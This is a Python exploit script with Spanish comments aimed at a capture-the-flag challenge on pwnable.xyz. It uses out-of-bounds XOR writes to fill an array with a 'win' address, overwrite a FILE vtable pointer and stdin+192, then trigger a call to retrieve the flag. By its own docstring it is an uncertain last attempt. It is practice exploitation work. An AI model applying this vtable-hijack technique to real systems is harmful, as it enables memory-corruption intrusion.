#!/usr/bin/env python3
"""
ÚLTIMA ESTRATEGIA:
Basado en que result[-5] es la vtable y causa crash,
voy a intentar:
1. Llenar result[] con una cadena: win, win, win...
2. Sobrescribir vtable con puntero a result[]
3. Además sobrescribir stdin+192 (offset -8) que también causa crash
4. La combinación de ambos podría triggerar ejecución

Si esto no funciona, el problema puede requerir:
- Conocimiento específico de la versión de glibc
- O una técnica que no conozco
"""
import socket
import time
import sys

host = "svc.pwnable.xyz"
port = 30029

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(30)
    
    try:
        s.connect((host, port))
    except:
        print("No puedo conectar")
        return False
    
    banner = s.recv(1024)
    print(banner.decode().strip())
    
    win = 0xa21
    result_base = 0x202200
    
    print(f"\nwin = {hex(win)}")
    print(f"result_base = {hex(result_base)}")
    
    # Llenar result[1-9] con win
    print("\nLlenando result[1-9]...")
    for i in range(1, 10):
        s.sendall(f"{win ^ i} {i} {i}\n".encode())
        time.sleep(0.02)
    
    time.sleep(0.3)
    try:
        s.recv(8192, socket.MSG_DONTWAIT)
    except:
        pass
    
    # Sobrescribir stdin+192 con result_base
    print("Sobrescribiendo stdin+192...")
    s.sendall(f"{result_base ^ 0x8888} {0x8888} -8\n".encode())
    time.sleep(0.2)
    try:
        s.recv(2048, socket.MSG_DONTWAIT)
    except:
        pass
    
    # Sobrescribir vtable con result[3]
    fake_vtable = result_base + 24  # result[3]
    print(f"Sobrescribiendo vtable con {hex(fake_vtable)}...")
    s.sendall(f"{fake_vtable ^ 0x5555} {0x5555} -5\n".encode())
    time.sleep(0.2)
    try:
        s.recv(2048, socket.MSG_DONTWAIT)
    except:
        pass
    
    # Trigger
    print("\nTrigger...")
    s.setblocking(False)
    
    try:
        s.sendall(b"3 7 4\n")
    except:
        print("Crash al enviar")
    
    # Capturar
    print("Capturando (20s)...")
    data = b""
    for _ in range(200):
        time.sleep(0.1)
        try:
            chunk = s.recv(8192)
            if chunk:
                data += chunk
                sys.stdout.write(chunk.decode())
                sys.stdout.flush()
        except:
            pass
    
    s.close()
    
    if data:
        decoded = data.decode()
        if "flag" in decoded.lower() or "{" in decoded:
            print("\n\n*** FLAG ***")
            print(decoded)
            return True
    
    return False

# Intentar varias veces con pequeñas variaciones
for attempt in range(3):
    print(f"\n{'='*60}")
    print(f"Intento {attempt+1}/3")
    print('='*60)
    
    if exploit():
        print("\n¡ÉXITO!")
        break
    
    if attempt < 2:
        print("\nEsperando 10s...")
        time.sleep(10)

print("\nFin de intentos")